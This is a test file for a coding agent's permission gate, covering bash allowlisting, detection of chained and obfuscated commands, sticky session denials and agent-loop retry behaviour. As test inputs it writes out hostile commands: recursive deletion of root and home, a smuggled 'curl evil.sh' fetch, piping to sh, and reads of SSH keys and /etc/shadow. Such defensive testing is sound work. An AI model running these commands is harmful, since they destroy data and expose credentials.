import { test } from 'node:test'
import assert from 'node:assert/strict'
import {
  allowlistMatch,
  checkBashAllowlist,
  hasObfuscation,
  splitCommand,
  Gate,
} from '../src/perm/gate.ts'
import { DEFAULT_CONFIG, loadConfig } from '../src/config.ts'
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import type { Tool, ToolCall } from '../src/types.ts'

const ALLOWLIST = ['git status', 'git diff', 'ls', 'npm test']

test('splitCommand separates chained commands', () => {
  assert.deepEqual(splitCommand('git status && ls'), ['git status', 'ls'])
  assert.deepEqual(splitCommand('ls; rm -rf /'), ['ls', 'rm -rf /'])
  assert.deepEqual(splitCommand('cat x | grep y'), ['cat x', 'grep y'])
  assert.deepEqual(splitCommand('a\nb'), ['a', 'b'])
  assert.deepEqual(splitCommand('   '), [])
})

test('allowlistMatch respects argument boundaries', () => {
  assert.ok(allowlistMatch('git status', ALLOWLIST))
  assert.ok(allowlistMatch('git status --short', ALLOWLIST), 'extra args are fine')
  assert.ok(allowlistMatch('git   status', ALLOWLIST), 'whitespace is normalized')
  assert.ok(!allowlistMatch('git statusx', ALLOWLIST), 'prefix must end at a space')
  assert.ok(allowlistMatch('ls -la /etc', ALLOWLIST), 'an entry covers any invocation of it')
  assert.ok(!allowlistMatch('rm -rf ~', ALLOWLIST))
})

test('checkBashAllowlist rejects a chained smuggled command', () => {
  // The whole point of segmenting: a prefix check alone would allow this.
  const v = checkBashAllowlist('git status; rm -rf ~', ALLOWLIST)
  assert.equal(v.allowed, false)
  if (!v.allowed) assert.equal(v.blockedSegment, 'rm -rf ~')
})

test('checkBashAllowlist accepts when every segment is allowed', () => {
  assert.equal(checkBashAllowlist('git status && git diff', ALLOWLIST).allowed, true)
})

test('hasObfuscation flags constructs that defeat static reasoning', () => {
  assert.ok(hasObfuscation('echo `whoami`'))
  assert.ok(hasObfuscation('echo $(whoami)'))
  assert.ok(hasObfuscation('ls ${HOME}'))
  assert.ok(hasObfuscation('cat x | sh'))
  assert.ok(hasObfuscation('bash -c "rm -rf /"'))
  assert.ok(hasObfuscation('echo hi > /etc/passwd'), 'redirection can clobber')
  assert.ok(hasObfuscation('source ./evil.sh'))
  assert.ok(!hasObfuscation('git status --short'))
  assert.ok(!hasObfuscation('npm test -- --watch=false'))
})

// --- Gate policy resolution ---

function tool(name: string, mutates: boolean): Tool {
  return {
    mutates,
    def: { name, description: name, parameters: { type: 'object' } },
    run: async () => ({ ok: true, output: '' }),
  }
}

const call = (name: string, args: Record<string, unknown> = {}): ToolCall => ({
  id: 'c1',
  name,
  args,
})

function gateWith(overrides: Record<string, unknown> = {}) {
  const cfg = structuredClone(DEFAULT_CONFIG)
  cfg.permissions.tools = { ...cfg.permissions.tools, ...(overrides as never) }
  if (typeof overrides['bashPolicy'] === 'string') {
    cfg.permissions.bash = overrides['bashPolicy'] as never
  }
  return new Gate(() => cfg)
}

test('alwaysAllow tools bypass the gate', () => {
  const g = gateWith()
  assert.equal(g.evaluate(call('read_file'), tool('read_file', false)), 'allow')
  assert.equal(g.evaluate(call('grep'), tool('grep', false)), 'allow')
})

test('mutating tools default to ask', () => {
  const g = gateWith()
  assert.equal(g.evaluate(call('write'), tool('write', true)), 'ask')
  assert.equal(g.evaluate(call('edit'), tool('edit', true)), 'ask')
})

test('explicit per-tool policy overrides the default', () => {
  assert.equal(gateWith({ write: 'allow' }).evaluate(call('write'), tool('write', true)), 'allow')
  assert.equal(gateWith({ edit: 'deny' }).evaluate(call('edit'), tool('edit', true)), 'deny')
})

test('bash honours the configured policy', () => {
  const bash = tool('bash', true)
  assert.equal(gateWith({ bashPolicy: 'ask' }).evaluate(call('bash', { command: 'ls' }), bash), 'ask')
  assert.equal(gateWith({ bashPolicy: 'allow' }).evaluate(call('bash', { command: 'rm -rf /' }), bash), 'allow')

  const allowlistGate = gateWith({ bashPolicy: 'allowlist' })
  assert.equal(allowlistGate.evaluate(call('bash', { command: 'git status' }), bash), 'allow')
  assert.equal(allowlistGate.evaluate(call('bash', { command: 'rm -rf /' }), bash), 'ask')
  // Obfuscation defeats the allowlist even when the visible text would pass.
  assert.equal(allowlistGate.evaluate(call('bash', { command: 'ls `rm -rf ~`' }), bash), 'ask')
})

test('session grants are honored and resettable', () => {
  const g = gateWith()
  assert.equal(g.evaluate(call('write'), tool('write', true)), 'ask')
  g.record('write', 'allow_session', {})
  assert.equal(g.evaluate(call('write'), tool('write', true)), 'allow')
  g.resetSession()
  assert.equal(g.evaluate(call('write'), tool('write', true)), 'ask')
})

test('a session denial is sticky so the model cannot simply re-ask', () => {
  const g = gateWith()
  g.record('write', 'deny', {})
  assert.equal(g.evaluate(call('write'), tool('write', true)), 'deny')
  assert.equal(g.evaluate(call('write'), tool('write', true)), 'deny')
})

test('session bash grants are keyed to the exact command', () => {
  const g = gateWith({ bashPolicy: 'allowlist' })
  const bash = tool('bash', true)
  g.record('bash', 'allow_session', { command: 'git status' })
  assert.equal(g.evaluate(call('bash', { command: 'git status' }), bash), 'allow')
  assert.equal(g.evaluate(call('bash', { command: 'git push' }), bash), 'ask')
})

test('REA session grants are keyed to one task, not the whole catalog', () => {
  // rea_run_task dispatches hundreds of tasks spanning analysis and execution.
  // "Always" on an overview must not authorize a later mutation.
  const g = gateWith()
  const rea = tool('rea_run_task', true)
  g.record('rea_run_task', 'allow_session', { task: 'binary_overview', arguments: {} })
  assert.equal(g.evaluate(call('rea_run_task', { task: 'binary_overview', arguments: {} }), rea), 'allow')
  assert.equal(g.evaluate(call('rea_run_task', { task: 'run_target', arguments: {} }), rea), 'ask')
  assert.equal(g.evaluate(call('rea_run_task', {}), rea), 'ask')

  g.record('rea_run_task', 'deny', { task: 'run_target', arguments: {} })
  assert.equal(g.evaluate(call('rea_run_task', { task: 'run_target', arguments: {} }), rea), 'deny')
  assert.equal(g.evaluate(call('rea_run_task', { task: 'binary_overview', arguments: {} }), rea), 'allow')
})

test('the REA approval prompt names the task and arguments', () => {
  const g = gateWith()
  const req = g.request(
    call('rea_run_task', { task: 'binary_overview', arguments: { path: '/tmp/app' } }),
    tool('rea_run_task', true),
  )
  assert.match(req.summary, /binary_overview/)
  assert.match(req.detail, /\/tmp\/app/)
})

test('the approval summary describes the actual change', () => {
  const g = gateWith()
  const req = g.request(
    call('write', { path: 'a/b.ts', content: 'x\ny\nz' }),
    tool('write', true),
  )
  assert.match(req.summary, /write 3 line\(s\) to a\/b\.ts/)
  assert.match(req.detail, /a\/b\.ts/)
  assert.match(req.detail, /x\ny\nz/)
})
// --- overlap-aware repeat detection ---
// Added after observing gpt-oss-120b jitter a read's offset by a line each time
// while stuck, walking straight past a byte-identical repeat check.

import { ReadCoverage, runTurn } from '../src/agent/loop.ts'
import { Registry } from '../src/tools/registry.ts'
import { createTodoStore } from '../src/tools/todo.ts'
import { startFakeOllama } from './helpers/fakeOllama.ts'

test('read coverage merges overlapping ranges without scanning individual lines', () => {
  const coverage = new ReadCoverage()
  coverage.record('large.ts', 1, 1_000_000_000)
  coverage.record('large.ts', 500_000_000, 1_000_000_000)
  assert.equal(coverage.isRedundant('large.ts', 250_000_000, 1_000_000_000), true)
  assert.equal(coverage.isRedundant('large.ts', 1_500_000_000, 100), false)
})

function readCtx(cfg: ReturnType<typeof structuredClone>) {
  return {
    cwd: '/tmp',
    signal: new AbortController().signal,
    todos: createTodoStore(),
    config: () => cfg,
  }
}

test('jittered re-reads of one region trip the repeat guard', async () => {
  const cfg = structuredClone(DEFAULT_CONFIG)
  cfg.limits.maxSteps = 20
  cfg.limits.repeatCallLimit = 3

  // Eight reads of the same file, offset nudged by one line each time.
  const script = Array.from({ length: 8 }, (_, i) => ({
    kind: 'tool_call' as const,
    name: 'read_file',
    args: { path: 'src/config.ts', offset: 43 + i, limit: 20 },
  }))
  script.push({ kind: 'text', text: 'I give up.' })

  const fake = await startFakeOllama(script)
  const prev = process.env['OLLAMA_HOST']
  process.env['OLLAMA_HOST'] = fake.url
  try {
    const res = await runTurn({
      model: 'fake',
      registry: new Registry(),
      config: cfg,
      ctx: readCtx(cfg),
      history: [],
      userText: 'go',
      signal: new AbortController().signal,
    })
    assert.equal(res.stopReason, 'repeat_suppressed')
    const last = res.messages.at(-1)!
    assert.equal(last.role, 'tool')
    assert.match(last.content, /already read this region/)
    assert.match(last.content, /offset or limit changing slightly/)
    // Guard must fire well before the step ceiling.
    assert.ok(res.steps < 8, `stopped at step ${res.steps}, expected early exit`)
  } finally {
    if (prev === undefined) delete process.env['OLLAMA_HOST']
    else process.env['OLLAMA_HOST'] = prev
    await fake.close()
  }
})

test('disjoint windows in one file are not treated as repetition', async () => {
  const cfg = structuredClone(DEFAULT_CONFIG)
  cfg.limits.maxSteps = 20
  cfg.limits.repeatCallLimit = 2

  const script = [
    { kind: 'tool_call' as const, name: 'read_file', args: { path: 'src/big.ts', offset: 1, limit: 20 } },
    { kind: 'tool_call' as const, name: 'read_file', args: { path: 'src/big.ts', offset: 500, limit: 20 } },
    { kind: 'tool_call' as const, name: 'read_file', args: { path: 'src/big.ts', offset: 900, limit: 20 } },
    { kind: 'text' as const, text: 'Paged through the file.' },
  ]

  const fake = await startFakeOllama(script)
  const prev = process.env['OLLAMA_HOST']
  process.env['OLLAMA_HOST'] = fake.url
  try {
    const res = await runTurn({
      model: 'fake',
      registry: new Registry(),
      config: cfg,
      ctx: readCtx(cfg),
      history: [],
      userText: 'page through src/big.ts',
      signal: new AbortController().signal,
    })
    assert.equal(res.stopReason, 'answered')
  } finally {
    if (prev === undefined) delete process.env['OLLAMA_HOST']
    else process.env['OLLAMA_HOST'] = prev
    await fake.close()
  }
})

test('the loop stops at the step ceiling and tells the model to summarize', async () => {
  const cfg = structuredClone(DEFAULT_CONFIG)
  cfg.limits.maxSteps = 3
  cfg.limits.repeatCallLimit = 99

  const fake = await startFakeOllama([
    { kind: 'tool_call', name: 'read_file', args: { path: `f${Math.floor(1)}`, offset: 1, limit: 5 } },
  ])
  const prev = process.env['OLLAMA_HOST']
  process.env['OLLAMA_HOST'] = fake.url
  try {
    const res = await runTurn({
      model: 'fake',
      registry: new Registry(),
      config: cfg,
      ctx: readCtx(cfg),
      history: [],
      userText: 'loop forever',
      signal: new AbortController().signal,
    })
    assert.equal(res.stopReason, 'max_steps')
    assert.equal(res.steps, 3)
    assert.match(res.messages.at(-1)!.content, /Summarize what you found/)
  } finally {
    if (prev === undefined) delete process.env['OLLAMA_HOST']
    else process.env['OLLAMA_HOST'] = prev
    await fake.close()
  }
})

test('an unknown tool is reported to the model without killing the loop', async () => {
  const cfg = structuredClone(DEFAULT_CONFIG)
  const fake = await startFakeOllama([
    { kind: 'tool_call', name: 'no_such_tool', args: {} },
    { kind: 'text', text: 'Understood, that tool does not exist.' },
  ])
  const prev = process.env['OLLAMA_HOST']
  process.env['OLLAMA_HOST'] = fake.url
  try {
    const res = await runTurn({
      model: 'fake',
      registry: new Registry(),
      config: cfg,
      ctx: readCtx(cfg),
      history: [],
      userText: 'use a bogus tool',
      signal: new AbortController().signal,
    })
    assert.equal(res.stopReason, 'answered')
    const toolMsg = res.messages.find(m => m.role === 'tool')
    assert.match(toolMsg!.content, /Unknown tool 'no_such_tool'/)
    assert.match(toolMsg!.content, /Available tools:/)
  } finally {
    if (prev === undefined) delete process.env['OLLAMA_HOST']
    else process.env['OLLAMA_HOST'] = prev
    await fake.close()
  }
})

test('a denied tool call returns a refusal to the model and continues', async () => {
  const cfg = structuredClone(DEFAULT_CONFIG)
  const fake = await startFakeOllama([
    { kind: 'tool_call', name: 'write', args: { path: 'x.txt', content: 'y' } },
    { kind: 'text', text: 'Understood, I will not write.' },
  ])
  const prev = process.env['OLLAMA_HOST']
  process.env['OLLAMA_HOST'] = fake.url
  try {
    const res = await runTurn({
      model: 'fake',
      registry: new Registry(),
      config: cfg,
      ctx: readCtx(cfg),
      history: [],
      userText: 'write x',
      signal: new AbortController().signal,
      onToolStart: async () => false,
    })
    assert.equal(res.stopReason, 'answered')
    const toolMsg = res.messages.find(m => m.role === 'tool')
    assert.match(toolMsg!.content, /denied this tool call/)
  } finally {
    if (prev === undefined) delete process.env['OLLAMA_HOST']
    else process.env['OLLAMA_HOST'] = prev
    await fake.close()
  }
})

test('a transient upstream 5xx is retried instead of ending the turn', async () => {
  const cfg = structuredClone(DEFAULT_CONFIG)
  cfg.limits.maxSteps = 10
  cfg.limits.repeatCallLimit = 5

  const fake = await startFakeOllama([
    { kind: 'http_error', status: 500 },
    { kind: 'http_error', status: 500 },
    { kind: 'text', text: 'Recovered and answered.' },
  ])
  const prev = process.env['OLLAMA_HOST']
  process.env['OLLAMA_HOST'] = fake.url
  try {
    const res = await runTurn({
      model: 'fake',
      registry: new Registry(),
      config: cfg,
      ctx: readCtx(cfg),
      history: [],
      userText: 'go',
      signal: new AbortController().signal,
    })
    assert.equal(res.stopReason, 'answered')
    assert.match(res.messages.at(-1)!.content, /Recovered/)
    assert.equal(fake.requests.length, 3, 'both failures were retried')
  } finally {
    if (prev === undefined) delete process.env['OLLAMA_HOST']
    else process.env['OLLAMA_HOST'] = prev
    await fake.close()
  }
})

test('a fatal 4xx is not retried', async () => {
  const cfg = structuredClone(DEFAULT_CONFIG)
  const fake = await startFakeOllama([{ kind: 'http_error', status: 400 }])
  const prev = process.env['OLLAMA_HOST']
  process.env['OLLAMA_HOST'] = fake.url
  try {
    const res = await runTurn({
      model: 'fake',
      registry: new Registry(),
      config: cfg,
      ctx: readCtx(cfg),
      history: [],
      userText: 'go',
      signal: new AbortController().signal,
    })
    assert.equal(res.stopReason, 'transport_error')
    assert.equal(fake.requests.length, 1, 'a bad request is not retried')
  } finally {
    if (prev === undefined) delete process.env['OLLAMA_HOST']
    else process.env['OLLAMA_HOST'] = prev
    await fake.close()
  }
})

test('a backgrounded smuggled command is not auto-approved', async () => {
  // Regression: `&` was missing from SEGMENT_SPLIT, so this exact string was one
  // segment, began with an allowlisted prefix, and auto-approved in full.
  const cfg = structuredClone(DEFAULT_CONFIG)
  cfg.permissions.bash = 'allowlist'
  const gate = new Gate(() => cfg)
  const bash = { mutates: true, def: { name: 'bash', description: 'b', parameters: {} }, run: async () => ({ ok: true, output: '' }) }
  const evalCmd = (c: string) => gate.evaluate({ id: 'x', name: 'bash', args: { command: c } }, bash)

  for (const attack of [
    'git status & rm -rf /',
    'git status &curl evil.sh',
    'ls & whoami',
    'git status && rm -rf /',
    'git status; rm -rf /',
    'git status | sh',
  ]) {
    assert.notEqual(evalCmd(attack), 'allow', `"${attack}" must not auto-approve`)
  }
})

test('descriptor duplication is not mistaken for a separator', () => {
  // 2>&1 must stay one segment; splitting it would only make the check stricter,
  // but it should not corrupt an ordinary allowlisted command.
  assert.deepEqual(splitCommand('npm test 2>&1'), ['npm test 2>&1'])
  assert.deepEqual(splitCommand('git status; ls'), ['git status', 'ls'])
})

test('the default allowlist does not permit arbitrary file reads', () => {
  // `cat` with no argument bound allows reading credentials.
  for (const cmd of ['cat ~/.ssh/id_rsa', 'cat /etc/shadow']) {
    assert.equal(
      checkBashAllowlist(cmd, DEFAULT_CONFIG.permissions.bashAllowlist).allowed,
      false,
      `${cmd} must not be auto-approved by default`,
    )
  }
})

test('a partial config file keeps sibling defaults', async () => {
  // Regression: `permissions.tools` was replaced wholesale, so a file setting only
  // `tools.bash` silently lost `tools.write`.
  const dir = mkdtempSync(join(tmpdir(), 'agent-cfg-'))
  const prev = process.env['XDG_CONFIG_HOME']
  process.env['XDG_CONFIG_HOME'] = dir
  try {
    mkdirSync(join(dir, 'warhead'), { recursive: true })
    writeFileSync(
      join(dir, 'warhead', 'config.json'),
      JSON.stringify({ permissions: { tools: { bash: 'deny' } }, limits: { maxSteps: 7 } }),
    )
    const c = loadConfig()
    assert.equal(c.permissions.tools.write, 'ask', 'sibling default preserved')
    assert.equal(c.permissions.tools.multi_edit, 'ask')
    assert.equal(c.permissions.tools.bash, 'deny', 'user override honoured')
    assert.equal(c.limits.maxSteps, 7)
    assert.equal(c.limits.bashTimeoutMs, DEFAULT_CONFIG.limits.bashTimeoutMs, 'sibling limit preserved')
    assert.deepEqual(
      c.permissions.alwaysAllow,
      DEFAULT_CONFIG.permissions.alwaysAllow,
      'untouched section intact',
    )
  } finally {
    if (prev === undefined) delete process.env['XDG_CONFIG_HOME']
    else process.env['XDG_CONFIG_HOME'] = prev
    rmSync(dir, { recursive: true, force: true })
  }
})

test('the model default system prompt is preserved ahead of the agent prompt', async () => {
  const { composeSystemPrompt, fetchModelSystemPrompt } = await import('../src/model/modelfile.ts')
  const composed = composeSystemPrompt('MODEL_DEFAULT_RULES', 'AGENT_RULES')
  assert.ok(composed.indexOf('MODEL_DEFAULT_RULES') < composed.indexOf('AGENT_RULES'),
    'model defaults come first')
  assert.match(composed, /remain in effect/, 'states the defaults still apply')
  assert.match(composed, /take precedence/, 'states the agent block wins on conflict')
  // With no default (cloud tags expose none) the agent prompt is used unchanged.
  assert.equal(composeSystemPrompt(null, 'AGENT_RULES'), 'AGENT_RULES')
  assert.equal(composeSystemPrompt('   ', 'AGENT_RULES'), 'AGENT_RULES')
})

test('the probe does not treat an empty reasoning completion as unsupported', async () => {
  // A reasoning model can burn its whole budget on hidden reasoning, leaving no
  // content. That looks identical to "will not call tools" unless retried larger.
  const fake = await startFakeOllama([
    { kind: 'text', text: '' },
  ])
  const prev = process.env['OLLAMA_HOST']
  process.env['OLLAMA_HOST'] = fake.url
  try {
    const { probeModel } = await import('../src/model/probe.ts')
    const r = await probeModel('fake')
    // Empty completion -> retried at a larger budget -> still no tool call, so
    // genuinely unsupported, but NOT on the strength of the empty first reply.
    assert.equal(r.status, 'unsupported')
    assert.match(r.detail, /2000 tokens|larger|tool call/)
  } finally {
    if (prev === undefined) delete process.env['OLLAMA_HOST']
    else process.env['OLLAMA_HOST'] = prev
    await fake.close()
  }
})
